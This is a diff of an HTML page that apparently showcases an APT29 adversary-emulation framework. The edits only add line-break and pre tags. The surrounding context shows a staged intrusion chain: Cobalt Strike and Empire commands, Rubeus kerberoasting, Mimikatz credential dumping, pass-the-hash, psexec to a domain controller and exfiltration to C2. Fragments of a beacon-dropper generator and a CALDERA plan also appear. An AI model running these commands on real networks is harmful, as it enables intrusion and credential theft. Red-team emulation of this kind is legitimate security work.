@@ -138,9 +138,9 @@
                     <strong>Phase 1: Initial Compromise</strong>
                     <p>Spearphishing email delivered to target executives containing malicious Office document</p>
                     <div class="command-output">
-<span class="command-prompt">Empire></span> usemodule situational_awareness/host/computerinfo
-<span class="command-success">[+]</span> Agent established on WORKSTATION-01 (user: jsmith)
-<span class="command-success">[+]</span> OS: Windows 10 Enterprise (Build 19044)
+<span class="command-prompt">Empire></span> usemodule situational_awareness/host/computerinfo<br>
+<span class="command-success">[+]</span> Agent established on WORKSTATION-01 (user: jsmith)<br>
+<span class="command-success">[+]</span> OS: Windows 10 Enterprise (Build 19044)<br>
 <span class="command-success">[+]</span> Domain: CORPORATE.LOCAL
                     </div>
                 </div>
@@ -150,9 +150,9 @@
                     <strong>Phase 2: Persistence & Defense Evasion</strong>
                     <p>Established persistence via scheduled task, initiated process injection to evade EDR</p>
                     <div class="command-output">
-<span class="command-prompt">beacon></span> execute-assembly Rubeus.exe kerberoast
-<span class="command-success">[+]</span> Kerberoastable user found: svc_sql@CORPORATE.LOCAL
-<span class="command-prompt">beacon></span> inject 1234 x64 /root/cobaltstrike/beacon.bin
+<span class="command-prompt">beacon></span> execute-assembly Rubeus.exe kerberoast<br>
+<span class="command-success">[+]</span> Kerberoastable user found: svc_sql@CORPORATE.LOCAL<br>
+<span class="command-prompt">beacon></span> inject 1234 x64 /root/cobaltstrike/beacon.bin<br>
 <span class="command-success">[+]</span> Process injection successful (PID: 1234)
                     </div>
                 </div>
@@ -162,12 +162,12 @@
                     <strong>Phase 3: Discovery & Enumeration</strong>
                     <p>Domain enumeration, privilege escalation preparation, credential harvesting</p>
                     <div class="command-output">
-<span class="command-prompt">beacon></span> powershell Get-DomainUser -AdminCount | Select samaccountname
+<span class="command-prompt">beacon></span> powershell Get-DomainUser -AdminCount | Select samaccountname<br>
 <span class="command-success">[+]</span> Domain Admins identified:
   - administrator
   - da_backup
-  - it_admin
-<span class="command-prompt">beacon></span> mimikatz sekurlsa::logonpasswords
+  - it_admin<br>
+<span class="command-prompt">beacon></span> mimikatz sekurlsa::logonpasswords<br>
 <span class="command-success">[+]</span> NTLM hash extracted: da_backup:aad3b435b51404ee...
                     </div>
                 </div>
@@ -177,9 +177,9 @@
                     <strong>Phase 4: Lateral Movement</strong>
                     <p>Pass-the-hash attack to domain controller, additional host compromise</p>
                     <div class="command-output">
-<span class="command-prompt">beacon></span> pth CORPORATE/da_backup aad3b435b51404ee...
-<span class="command-success">[+]</span> Authentication successful to DC01.corporate.local
-<span class="command-prompt">beacon></span> jump psexec_psh DC01 smb_x64
+<span class="command-prompt">beacon></span> pth CORPORATE/da_backup aad3b435b51404ee...<br>
+<span class="command-success">[+]</span> Authentication successful to DC01.corporate.local<br>
+<span class="command-prompt">beacon></span> jump psexec_psh DC01 smb_x64<br>
 <span class="command-success">[+]</span> Session established on DC01 (SYSTEM)
                     </div>
                 </div>
@@ -189,9 +189,9 @@
                     <strong>Phase 5: Data Collection & Exfiltration</strong>
                     <p>Sensitive data identified, encrypted, and staged for exfiltration</p>
                     <div class="command-output">
-<span class="command-prompt">beacon></span> powershell Get-ChildItem -Path "C:\Shares\Finance" -Recurse | Where {$_.Name -match "budget|financial|confidential"}
-<span class="command-success">[+]</span> 47 sensitive files identified (Total: 2.3GB)
-<span class="command-prompt">beacon></span> download C:\temp\exfil_package.7z
+<span class="command-prompt">beacon></span> powershell Get-ChildItem -Path "C:\Shares\Finance" -Recurse | Where {$_.Name -match "budget|financial|confidential"}<br>
+<span class="command-success">[+]</span> 47 sensitive files identified (Total: 2.3GB)<br>
+<span class="command-prompt">beacon></span> download C:\temp\exfil_package.7z<br>
 <span class="command-success">[+]</span> Downloaded 2.3GB via HTTPS to C2 server
                     </div>
                 </div>
@@ -275,6 +275,7 @@
             <p>Framework includes custom payload generation capabilities to simulate advanced adversaries and test signature-based detection systems.</p>
             
             <div class="code-block" data-lang="Python">
+                <pre>
 # Custom APT29 beacon generator
 class APT29BeaconGenerator:
     def __init__(self, c2_server, jitter_percent=30):
@@ -310,6 +311,7 @@ class APT29BeaconGenerator:
             return self.create_hta_dropper(beacon_payload)
         elif delivery_method == "powershell":
             return self.create_ps_dropper(beacon_payload)
+                </pre>
             </div>
         </div>
 
@@ -318,6 +320,7 @@ class APT29BeaconGenerator:
             <p>CALDERA-based autonomous execution with intelligent decision making and adaptive tactics based on environment discovery.</p>
             
             <div class="code-block" data-lang="YAML">
+                <pre>
 # APT29 Emulation Plan (CALDERA)
 id: apt29-full-chain
 name: "APT29 Enterprise Compromise Simulation"
@@ -360,6 +363,7 @@ phases:
         requirements:
           - "vulnerable_target"
           - "print_spooler_running"
+                </pre>
             </div>
         </div>
 
@@ -433,6 +437,7 @@ phases:
         </div>
 
     </div>
+    
     <!-- Back to Top Button -->
     <button id="backToTop" title="Back to Top">&#8679;</button>
     <script>
